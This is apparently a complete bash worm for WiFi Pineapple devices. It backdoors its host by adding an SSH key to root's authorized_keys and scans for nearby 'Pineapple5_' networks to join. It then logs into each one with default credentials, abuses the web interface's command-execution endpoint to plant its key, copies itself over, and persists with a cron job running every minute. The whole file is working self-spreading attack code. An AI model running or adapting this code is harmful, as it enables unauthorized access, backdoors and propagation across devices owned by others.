#!/bin/bash
self=`uci get wireless.@wifi-iface[0].ssid`

init() {
	#Mark the device as being pwn3d.
	if grep -q "\"\$6[^\"]" /lib/wifi/mac80211.sh;
	then
		sed -i -e 's/"\$6/"$6" "/' /lib/wifi/mac80211.sh
		uci set wireless.@wifi-iface[0].ssid="$(uci get wireless.@wifi-iface[0].ssid) "
		uci commit
		wifi
		sleep 3
	fi
	#Make ourselves a key we'll use for all our children.
	if [ ! -f /tospo/tospo_rsa.pub ]; then
		echo "Generating tospo ssh key..."
		ssh-keygen -b 768 -f /tospo/tospo_rsa -N ""
	fi
	#Backdoor the machine with the master key...
	mkdir -p /root/.ssh
	touch /root/.ssh/authorized_keys
	if [ -f /root/.ssh/authorized_keys ]; then
		grep -q "$(cat /tospo/tvbd.pub)" /root/.ssh/authorized_keys || cat /tospo/tvbd.pub >> /root/.ssh/authorized_keys
	fi
	#Visual sentinel
	kill $(ps | grep [b]link | awk '{print $1}')
}

pushstate() {
	echo "Pushing state..."
	uci export wireless > /tospo/w
	uci export network > /tospo/n
}

popstate () {
	echo "Popping state..."
	ifconfig br-lan 172.16.42.1 up
	ifconfig wlan0 up
	ifconfig wlan1 0.0.0.0 && ifconfig wlan1 down
	uci import -f /tospo/w && uci commit
	uci import -f /tospo/n && uci commit
	wifi
}

connect() {
	ssid=$1
	echo "Connecting to $ssid..."
	ifconfig wlan1 up
	echo "Avoiding conflicts..."
	#TODO: Store this value to better preserve state for custom configurations
	ifconfig br-lan 172.16.42.191 down
	ifconfig wlan0 down

	echo "Guess at the client-mode interface..."
	wid=$(uci show wireless | grep "wireless.@wifi-iface\[[0-9]\].device=radio1" | cut -d'[' -f 2 | cut -d']' -f 1)
	echo "Stripping keys just in case..."	
	uci delete wireless.@wifi-iface[$wid].key
	uci delete wireless.@wifi-iface[$wid].encryption
	echo "Connect to the target network..."
	uci set wireless.@wifi-iface[$wid].network=wan
	uci set wireless.@wifi-iface[$wid].mode=sta
	uci set wireless.@wifi-iface[$wid].ssid="$ssid"
	uci set wireless.@wifi-iface[$wid].hidden=0
	uci set wireless.radio1.channel=11
	uci commit wireless
	wifi
	sleep 3
	ifconfig wlan1 172.16.42.146
}

post() {
	len=`printf "$2" | wc -c`
	printf "POST $1 HTTP/1.1\nHost: 172.16.42.1:1471\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=$3\nContent-Length: $len\nConnection: close\n\n$2" | nc 172.16.42.1 1471
}

login() {
	echo "Logging in..."
	creds="username=root&password=pineapplesareyummy&login="
	post '/includes/api/login.php' "$creds" "tospovirus" | grep -i 'invalid username' && echo "Login Failed..." && popstate && exit
	echo "Logged in Successfully!"
}

infect() {
	post '/components/system/configuration/functions.php?execute=' "_csrfToken=a6f6832ff4df61608bf3e38b4facc7550e42244d&commands=/etc/init.d/sshd enable;/etc/init.d/sshd start;mkdir /root/.ssh; printf \"\$(echo $(hexdump -e'16/1 "%02x"' /tospo/tospo_rsa.pub)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">>/root/.ssh/authorized_keys" "tospovirus"
	ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa 172.16.42.1 "mkdir -p /tospo" && scp -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa -r /tospo/tv* 172.16.42.1:/tospo/
}

persist() {
	ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa 172.16.42.1 'printf "* * * * * /tospo/tv" | crontab -'
}

init
echo "Scanning for new devices..."
for net in `iwlist wlan0 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$self"`
do
	pushstate
	connect `echo $net | cut -d '"' -f 2`
	login 
	infect
	persist
	popstate
	break
done
